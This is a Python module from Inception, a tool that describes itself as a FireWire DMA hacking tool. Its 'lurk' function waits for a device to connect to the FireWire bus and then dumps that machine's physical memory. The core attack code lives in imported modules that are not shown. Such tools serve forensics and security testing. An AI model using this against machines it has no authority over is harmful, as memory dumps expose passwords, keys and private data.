'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.
'''

from inception import firewire, memdump, cfg, term
import time

def lurk():
    '''
    Wait for devices to connect to the FireWire bus, and attack when they do
    '''
    start = cfg.startaddress
    end = cfg.memsize
    bb = term.BeachBall()
    
    try:
        s = '\n'.join(cfg.wrapper.wrap('[-] Lurking in the shrubbery ' +
                                        'waiting for a device to connect. ' +
                                        'Ctrl-C to abort')) + '\r'
        print(s, end = '')
        
        # Initiate FireWire
        fw = firewire.FireWire()
        while True: # Loop until aborted, and poll for devices
            while len(fw.devices) == 0:
                # Draw a beach ball while waiting
                bb.draw()
                time.sleep(cfg.polldelay)

            print() # Newline 
            term.info('FireWire device detected')
            memdump.dump(start, end)
            
    except KeyboardInterrupt:
        print() # TODO: Fix keyboard handling (interrupt handling)
        raise KeyboardInterrupt
        
